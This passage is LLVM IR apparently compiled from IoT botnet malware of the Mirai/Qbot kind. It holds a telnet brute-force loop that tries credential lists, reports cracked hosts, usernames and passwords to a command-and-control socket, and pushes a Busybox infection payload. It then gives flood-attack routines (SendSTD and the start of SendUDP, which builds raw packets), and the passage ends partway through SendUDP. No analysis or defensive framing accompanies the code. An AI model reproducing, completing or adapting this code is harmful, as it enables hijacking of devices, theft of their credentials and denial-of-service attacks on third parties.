  %495 = load i32, i32* %6, align 4
  %496 = sext i32 %495 to i64
  %497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %496
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %497, i32 0, i32 0
  %499 = load i32, i32* %498, align 16
  %500 = load i32, i32* %6, align 4
  %501 = sext i32 %500 to i64
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %501
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %502, i32 0, i32 5
  %504 = load i8, i8* %503, align 1
  %505 = zext i8 %504 to i64
  %506 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %505
  %507 = load i8*, i8** %506, align 8
  %508 = load i32, i32* %6, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %509
  %511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %510, i32 0, i32 5
  %512 = load i8, i8* %511, align 1
  %513 = zext i8 %512 to i64
  %514 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %513
  %515 = load i8*, i8** %514, align 8
  %516 = call i64 @strlen(i8* noundef %515) #11
  %517 = call i64 @send(i32 noundef %499, i8* noundef %507, i64 noundef %516, i32 noundef 16384)
  %518 = icmp slt i64 %517, 0
  br i1 %518, label %519, label %523

519:                                              ; preds = %494
  %520 = load i32, i32* %6, align 4
  %521 = sext i32 %520 to i64
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %521
  call void @reset_telstate(%struct.telstate_t* noundef %522)
  br label %883

523:                                              ; preds = %494
  %524 = load i32, i32* %6, align 4
  %525 = sext i32 %524 to i64
  %526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %525
  %527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %526, i32 0, i32 0
  %528 = load i32, i32* %527, align 16
  %529 = call i64 @send(i32 noundef %528, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.487, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  %530 = icmp slt i64 %529, 0
  br i1 %530, label %531, label %535

531:                                              ; preds = %523
  %532 = load i32, i32* %6, align 4
  %533 = sext i32 %532 to i64
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %533
  call void @reset_telstate(%struct.telstate_t* noundef %534)
  br label %883

535:                                              ; preds = %523
  %536 = load i32, i32* %6, align 4
  %537 = sext i32 %536 to i64
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %537
  call void @advance_telstate(%struct.telstate_t* noundef %538, i32 noundef 6)
  br label %882

539:                                              ; preds = %91
  %540 = load i32, i32* %6, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %541
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %542, i32 0, i32 0
  %544 = load i32, i32* %543, align 16
  %545 = load i32, i32* %3, align 4
  %546 = load i32, i32* %6, align 4
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %547
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %548, i32 0, i32 9
  %550 = load i8*, i8** %549, align 8
  %551 = call i32 @read_until_response(i32 noundef %544, i32 noundef %545, i8* noundef %550, i32 noundef 1024, i8** noundef getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i64 0, i64 0))
  %552 = icmp ne i32 %551, 0
  br i1 %552, label %553, label %624

553:                                              ; preds = %539
  %554 = call i64 @time(i64* noundef null) #10
  %555 = trunc i64 %554 to i32
  %556 = load i32, i32* %6, align 4
  %557 = sext i32 %556 to i64
  %558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %557
  %559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %558, i32 0, i32 7
  store i32 %555, i32* %559, align 16
  %560 = load i32, i32* %6, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %561
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %562, i32 0, i32 9
  %564 = load i8*, i8** %563, align 8
  %565 = call i32 @contains_fail(i8* noundef %564)
  %566 = icmp ne i32 %565, 0
  br i1 %566, label %567, label %571

567:                                              ; preds = %553
  %568 = load i32, i32* %6, align 4
  %569 = sext i32 %568 to i64
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %569
  call void @advance_telstate(%struct.telstate_t* noundef %570, i32 noundef 0)
  br label %623

571:                                              ; preds = %553
  %572 = load i32, i32* %6, align 4
  %573 = sext i32 %572 to i64
  %574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %573
  %575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %574, i32 0, i32 9
  %576 = load i8*, i8** %575, align 8
  %577 = call i32 @contains_success(i8* noundef %576)
  %578 = icmp ne i32 %577, 0
  br i1 %578, label %579, label %618

579:                                              ; preds = %571
  %580 = load i32, i32* %6, align 4
  %581 = sext i32 %580 to i64
  %582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %581
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %582, i32 0, i32 3
  %584 = load i8, i8* %583, align 1
  %585 = zext i8 %584 to i32
  %586 = icmp eq i32 %585, 2
  br i1 %586, label %587, label %591

587:                                              ; preds = %579
  %588 = load i32, i32* %6, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %589
  call void @advance_telstate(%struct.telstate_t* noundef %590, i32 noundef 7)
  br label %617

591:                                              ; preds = %579
  %592 = load i32, i32* @mainCommSock, align 4
  %593 = load i32, i32* %6, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %594
  %596 = call i8* @get_telstate_host(%struct.telstate_t* noundef %595)
  %597 = load i32, i32* %6, align 4
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %598
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %599, i32 0, i32 4
  %601 = load i8, i8* %600, align 2
  %602 = zext i8 %601 to i64
  %603 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %602
  %604 = load i8*, i8** %603, align 8
  %605 = load i32, i32* %6, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %606
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %607, i32 0, i32 5
  %609 = load i8, i8* %608, align 1
  %610 = zext i8 %609 to i64
  %611 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %610
  %612 = load i8*, i8** %611, align 8
  %613 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %592, i8* noundef getelementptr inbounds ([72 x i8], [72 x i8]* @.str.488, i64 0, i64 0), i8* noundef %596, i8* noundef %604, i8* noundef %612)
  %614 = load i32, i32* %6, align 4
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %615
  call void @advance_telstate(%struct.telstate_t* noundef %616, i32 noundef 7)
  br label %617

617:                                              ; preds = %591, %587
  br label %622

618:                                              ; preds = %571
  %619 = load i32, i32* %6, align 4
  %620 = sext i32 %619 to i64
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %620
  call void @reset_telstate(%struct.telstate_t* noundef %621)
  br label %622

622:                                              ; preds = %618, %617
  br label %623

623:                                              ; preds = %622, %567
  br label %883

624:                                              ; preds = %539
  %625 = load i32, i32* %6, align 4
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %626
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %627, i32 0, i32 7
  %629 = load i32, i32* %628, align 16
  %630 = add i32 %629, 7
  %631 = zext i32 %630 to i64
  %632 = call i64 @time(i64* noundef null) #10
  %633 = icmp slt i64 %631, %632
  br i1 %633, label %634, label %638

634:                                              ; preds = %624
  %635 = load i32, i32* %6, align 4
  %636 = sext i32 %635 to i64
  %637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %636
  call void @reset_telstate(%struct.telstate_t* noundef %637)
  br label %638

638:                                              ; preds = %634, %624
  br label %882

639:                                              ; preds = %91
  %640 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i64 0, i64 0
  %641 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %640, i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.489, i64 0, i64 0), i8** noundef getelementptr inbounds ([13 x i8*], [13 x i8*]* @Temp_Directorys, i64 0, i64 0)) #10
  %642 = load i32, i32* %6, align 4
  %643 = sext i32 %642 to i64
  %644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %643
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %644, i32 0, i32 0
  %646 = load i32, i32* %645, align 16
  %647 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i64 0, i64 0
  %648 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i64 0, i64 0
  %649 = call i64 @strlen(i8* noundef %648) #11
  %650 = call i64 @send(i32 noundef %646, i8* noundef %647, i64 noundef %649, i32 noundef 16384)
  %651 = icmp slt i64 %650, 0
  br i1 %651, label %652, label %656

652:                                              ; preds = %639
  %653 = load i32, i32* %6, align 4
  %654 = sext i32 %653 to i64
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %654
  call void @reset_telstate(%struct.telstate_t* noundef %655)
  br label %883

656:                                              ; preds = %639
  call void @RemoveTempDirs()
  %657 = load i32, i32* @mainCommSock, align 4
  %658 = load i32, i32* %6, align 4
  %659 = sext i32 %658 to i64
  %660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %659
  %661 = call i8* @get_telstate_host(%struct.telstate_t* noundef %660)
  %662 = load i32, i32* %6, align 4
  %663 = sext i32 %662 to i64
  %664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %663
  %665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %664, i32 0, i32 4
  %666 = load i8, i8* %665, align 2
  %667 = zext i8 %666 to i64
  %668 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %667
  %669 = load i8*, i8** %668, align 8
  %670 = load i32, i32* %6, align 4
  %671 = sext i32 %670 to i64
  %672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %671
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %672, i32 0, i32 5
  %674 = load i8, i8* %673, align 1
  %675 = zext i8 %674 to i64
  %676 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %675
  %677 = load i8*, i8** %676, align 8
  %678 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %657, i8* noundef getelementptr inbounds ([91 x i8], [91 x i8]* @.str.490, i64 0, i64 0), i8* noundef %661, i8* noundef %669, i8* noundef %677)
  %679 = getelementptr inbounds [80 x i8], [80 x i8]* %25, i64 0, i64 0
  %680 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %679, i8* noundef getelementptr inbounds ([27 x i8], [27 x i8]* @.str.491, i64 0, i64 0), i8** noundef getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i64 0, i64 0), i8** noundef getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i64 0, i64 0)) #10
  %681 = load i32, i32* %6, align 4
  %682 = sext i32 %681 to i64
  %683 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %682
  %684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %683, i32 0, i32 0
  %685 = load i32, i32* %684, align 16
  %686 = getelementptr inbounds [80 x i8], [80 x i8]* %25, i64 0, i64 0
  %687 = getelementptr inbounds [80 x i8], [80 x i8]* %25, i64 0, i64 0
  %688 = call i64 @strlen(i8* noundef %687) #11
  %689 = call i64 @send(i32 noundef %685, i8* noundef %686, i64 noundef %688, i32 noundef 16384)
  %690 = icmp slt i64 %689, 0
  br i1 %690, label %691, label %695

691:                                              ; preds = %656
  %692 = load i32, i32* %6, align 4
  %693 = sext i32 %692 to i64
  %694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %693
  call void @reset_telstate(%struct.telstate_t* noundef %694)
  br label %883

695:                                              ; preds = %656
  %696 = load i32, i32* @mainCommSock, align 4
  %697 = load i32, i32* %6, align 4
  %698 = sext i32 %697 to i64
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %698
  %700 = call i8* @get_telstate_host(%struct.telstate_t* noundef %699)
  %701 = load i32, i32* %6, align 4
  %702 = sext i32 %701 to i64
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %702
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %703, i32 0, i32 4
  %705 = load i8, i8* %704, align 2
  %706 = zext i8 %705 to i64
  %707 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %706
  %708 = load i8*, i8** %707, align 8
  %709 = load i32, i32* %6, align 4
  %710 = sext i32 %709 to i64
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %710
  %712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %711, i32 0, i32 5
  %713 = load i8, i8* %712, align 1
  %714 = zext i8 %713 to i64
  %715 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %714
  %716 = load i8*, i8** %715, align 8
  %717 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %696, i8* noundef getelementptr inbounds ([78 x i8], [78 x i8]* @.str.492, i64 0, i64 0), i8* noundef %700, i8* noundef %708, i8* noundef %716)
  %718 = load i32, i32* %6, align 4
  %719 = sext i32 %718 to i64
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %719
  call void @advance_telstate(%struct.telstate_t* noundef %720, i32 noundef 8)
  br label %882

721:                                              ; preds = %91
  %722 = call i64 @time(i64* noundef null) #10
  %723 = trunc i64 %722 to i32
  %724 = load i32, i32* %6, align 4
  %725 = sext i32 %724 to i64
  %726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %725
  %727 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %726, i32 0, i32 7
  store i32 %723, i32* %727, align 16
  %728 = load i32, i32* %6, align 4
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %729
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %730, i32 0, i32 0
  %732 = load i32, i32* %731, align 16
  %733 = call i64 @send(i32 noundef %732, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.493, i64 0, i64 0), i64 noundef 4, i32 noundef 16384)
  %734 = icmp slt i64 %733, 0
  br i1 %734, label %735, label %736

735:                                              ; preds = %721
  br label %736

736:                                              ; preds = %735, %721
  %737 = load i32, i32* %6, align 4
  %738 = sext i32 %737 to i64
  %739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %738
  %740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %739, i32 0, i32 0
  %741 = load i32, i32* %740, align 16
  %742 = call i64 @send(i32 noundef %741, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.494, i64 0, i64 0), i64 noundef 7, i32 noundef 16384)
  %743 = icmp slt i64 %742, 0
  br i1 %743, label %744, label %745

744:                                              ; preds = %736
  br label %745

745:                                              ; preds = %744, %736
  %746 = load i32, i32* %6, align 4
  %747 = sext i32 %746 to i64
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %747
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %748, i32 0, i32 0
  %750 = load i32, i32* %749, align 16
  %751 = load i8*, i8** @Busybox_Payload, align 8
  %752 = load i8*, i8** @Busybox_Payload, align 8
  %753 = call i64 @strlen(i8* noundef %752) #11
  %754 = call i64 @send(i32 noundef %750, i8* noundef %751, i64 noundef %753, i32 noundef 16384)
  %755 = icmp slt i64 %754, 0
  br i1 %755, label %756, label %760

756:                                              ; preds = %745
  %757 = load i32, i32* %6, align 4
  %758 = sext i32 %757 to i64
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %758
  call void @reset_telstate(%struct.telstate_t* noundef %759)
  br label %883

760:                                              ; preds = %745
  %761 = load i32, i32* @mainCommSock, align 4
  %762 = load i32, i32* %6, align 4
  %763 = sext i32 %762 to i64
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %763
  %765 = call i8* @get_telstate_host(%struct.telstate_t* noundef %764)
  %766 = load i32, i32* %6, align 4
  %767 = sext i32 %766 to i64
  %768 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %767
  %769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %768, i32 0, i32 4
  %770 = load i8, i8* %769, align 2
  %771 = zext i8 %770 to i64
  %772 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %771
  %773 = load i8*, i8** %772, align 8
  %774 = load i32, i32* %6, align 4
  %775 = sext i32 %774 to i64
  %776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %775
  %777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %776, i32 0, i32 5
  %778 = load i8, i8* %777, align 1
  %779 = zext i8 %778 to i64
  %780 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %779
  %781 = load i8*, i8** %780, align 8
  %782 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %761, i8* noundef getelementptr inbounds ([75 x i8], [75 x i8]* @.str.495, i64 0, i64 0), i8* noundef %765, i8* noundef %773, i8* noundef %781)
  %783 = load i32, i32* %6, align 4
  %784 = sext i32 %783 to i64
  %785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %784
  %786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %785, i32 0, i32 0
  %787 = load i32, i32* %786, align 16
  %788 = load i32, i32* %3, align 4
  %789 = load i32, i32* %6, align 4
  %790 = sext i32 %789 to i64
  %791 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %790
  %792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %791, i32 0, i32 9
  %793 = load i8*, i8** %792, align 8
  %794 = call i32 @read_until_response(i32 noundef %787, i32 noundef %788, i8* noundef %793, i32 noundef 1024, i8** noundef bitcast ([10 x i8]* @.str.499 to i8**))
  %795 = icmp ne i32 %794, 0
  br i1 %795, label %796, label %836

796:                                              ; preds = %760
  %797 = load i32, i32* %6, align 4
  %798 = sext i32 %797 to i64
  %799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %798
  %800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %799, i32 0, i32 9
  %801 = load i8*, i8** %800, align 8
  %802 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* noundef %801, i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.496, i64 0, i64 0))
  %803 = icmp ne i32 %802, 0
  br i1 %803, label %804, label %835

804:                                              ; preds = %796
  %805 = load i32, i32* %6, align 4
  %806 = sext i32 %805 to i64
  %807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %806
  %808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %807, i32 0, i32 3
  %809 = load i8, i8* %808, align 1
  %810 = zext i8 %809 to i32
  %811 = icmp ne i32 %810, 3
  br i1 %811, label %812, label %835

812:                                              ; preds = %804
  %813 = load i32, i32* @mainCommSock, align 4
  %814 = load i32, i32* %6, align 4
  %815 = sext i32 %814 to i64
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %815
  %817 = call i8* @get_telstate_host(%struct.telstate_t* noundef %816)
  %818 = load i32, i32* %6, align 4
  %819 = sext i32 %818 to i64
  %820 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %819
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %820, i32 0, i32 4
  %822 = load i8, i8* %821, align 2
  %823 = zext i8 %822 to i64
  %824 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %823
  %825 = load i8*, i8** %824, align 8
  %826 = load i32, i32* %6, align 4
  %827 = sext i32 %826 to i64
  %828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %827
  %829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %828, i32 0, i32 5
  %830 = load i8, i8* %829, align 1
  %831 = zext i8 %830 to i64
  %832 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %831
  %833 = load i8*, i8** %832, align 8
  %834 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %813, i8* noundef getelementptr inbounds ([85 x i8], [85 x i8]* @.str.497, i64 0, i64 0), i8* noundef %817, i8* noundef %825, i8* noundef %833)
  br label %835

835:                                              ; preds = %812, %804, %796
  br label %836

836:                                              ; preds = %835, %760
  %837 = load i32, i32* %6, align 4
  %838 = sext i32 %837 to i64
  %839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %838
  %840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %839, i32 0, i32 7
  %841 = load i32, i32* %840, align 16
  %842 = add i32 %841, 45
  %843 = zext i32 %842 to i64
  %844 = call i64 @time(i64* noundef null) #10
  %845 = icmp slt i64 %843, %844
  br i1 %845, label %846, label %881

846:                                              ; preds = %836
  %847 = load i32, i32* %6, align 4
  %848 = sext i32 %847 to i64
  %849 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %848
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %849, i32 0, i32 3
  %851 = load i8, i8* %850, align 1
  %852 = zext i8 %851 to i32
  %853 = icmp ne i32 %852, 3
  br i1 %853, label %854, label %877

854:                                              ; preds = %846
  %855 = load i32, i32* @mainCommSock, align 4
  %856 = load i32, i32* %6, align 4
  %857 = sext i32 %856 to i64
  %858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %857
  %859 = call i8* @get_telstate_host(%struct.telstate_t* noundef %858)
  %860 = load i32, i32* %6, align 4
  %861 = sext i32 %860 to i64
  %862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %861
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %862, i32 0, i32 4
  %864 = load i8, i8* %863, align 2
  %865 = zext i8 %864 to i64
  %866 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %865
  %867 = load i8*, i8** %866, align 8
  %868 = load i32, i32* %6, align 4
  %869 = sext i32 %868 to i64
  %870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %869
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %870, i32 0, i32 5
  %872 = load i8, i8* %871, align 1
  %873 = zext i8 %872 to i64
  %874 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %873
  %875 = load i8*, i8** %874, align 8
  %876 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %855, i8* noundef getelementptr inbounds ([72 x i8], [72 x i8]* @.str.498, i64 0, i64 0), i8* noundef %859, i8* noundef %867, i8* noundef %875)
  br label %877

877:                                              ; preds = %854, %846
  %878 = load i32, i32* %6, align 4
  %879 = sext i32 %878 to i64
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %879
  call void @reset_telstate(%struct.telstate_t* noundef %880)
  br label %881

881:                                              ; preds = %877, %836
  br label %882

882:                                              ; preds = %881, %695, %638, %535, %493, %438, %396, %344, %233, %91
  br label %883

883:                                              ; preds = %882, %756, %691, %652, %623, %531, %519, %478, %434, %422, %381, %325, %321, %198, %167
  %884 = load i32, i32* %6, align 4
  %885 = add nsw i32 %884, 1
  store i32 %885, i32* %6, align 4
  br label %73, !llvm.loop !40

886:                                              ; preds = %73
  br label %71
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @SendSTD(i8* noundef %0, i32 noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %12 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 0) #10
  store i32 %12, i32* %7, align 4
  %13 = call i64 @time(i64* noundef null) #10
  store i64 %13, i64* %8, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = call %struct.hostent* @gethostbyname(i8* noundef %14)
  store %struct.hostent* %15, %struct.hostent** %10, align 8
  %16 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %16, i8 0, i64 16, i1 false)
  %17 = load %struct.hostent*, %struct.hostent** %10, align 8
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %17, i32 0, i32 4
  %19 = load i8**, i8*** %18, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %23 = bitcast %struct.in_addr* %22 to i8*
  %24 = load %struct.hostent*, %struct.hostent** %10, align 8
  %25 = getelementptr inbounds %struct.hostent, %struct.hostent* %24, i32 0, i32 3
  %26 = load i32, i32* %25, align 4
  %27 = sext i32 %26 to i64
  call void @bcopy(i8* noundef %21, i8* noundef %23, i64 noundef %27) #10
  %28 = load %struct.hostent*, %struct.hostent** %10, align 8
  %29 = getelementptr inbounds %struct.hostent, %struct.hostent* %28, i32 0, i32 2
  %30 = load i32, i32* %29, align 8
  %31 = trunc i32 %30 to i16
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %31, i16* %32, align 4
  %33 = load i32, i32* %5, align 4
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  store i32 0, i32* %11, align 4
  br label %36

36:                                               ; preds = %55, %3
  %37 = load i32, i32* %11, align 4
  %38 = icmp uge i32 %37, 50
  br i1 %38, label %39, label %55

39:                                               ; preds = %36
  %40 = load i32, i32* %7, align 4
  %41 = call i64 @send(i32 noundef %40, i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.500, i64 0, i64 0), i64 noundef 65, i32 noundef 0)
  %42 = load i32, i32* %7, align 4
  %43 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %44 = call i32 @connect(i32 noundef %42, %struct.sockaddr* noundef %43, i32 noundef 16)
  %45 = call i64 @time(i64* noundef null) #10
  %46 = load i64, i64* %8, align 8
  %47 = load i32, i32* %6, align 4
  %48 = sext i32 %47 to i64
  %49 = add nsw i64 %46, %48
  %50 = icmp sge i64 %45, %49
  br i1 %50, label %51, label %54

51:                                               ; preds = %39
  %52 = load i32, i32* %7, align 4
  %53 = call i32 @close(i32 noundef %52)
  call void @_exit(i32 noundef 0) #13
  unreachable

54:                                               ; preds = %39
  store i32 0, i32* %11, align 4
  br label %55

55:                                               ; preds = %54, %36
  %56 = load i32, i32* %11, align 4
  %57 = add i32 %56, 1
  store i32 %57, i32* %11, align 4
  br label %36
}

declare %struct.hostent* @gethostbyname(i8* noundef) #1

; Function Attrs: nounwind
declare void @bcopy(i8* noundef, i8* noundef, i64 noundef) #3

; Function Attrs: noreturn
declare void @_exit(i32 noundef) #8

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @SendUDP(i8* noundef %0, i32 noundef %1, i32 noundef %2, i32 noundef %3, i32 noundef %4, i32 noundef %5) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i64, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
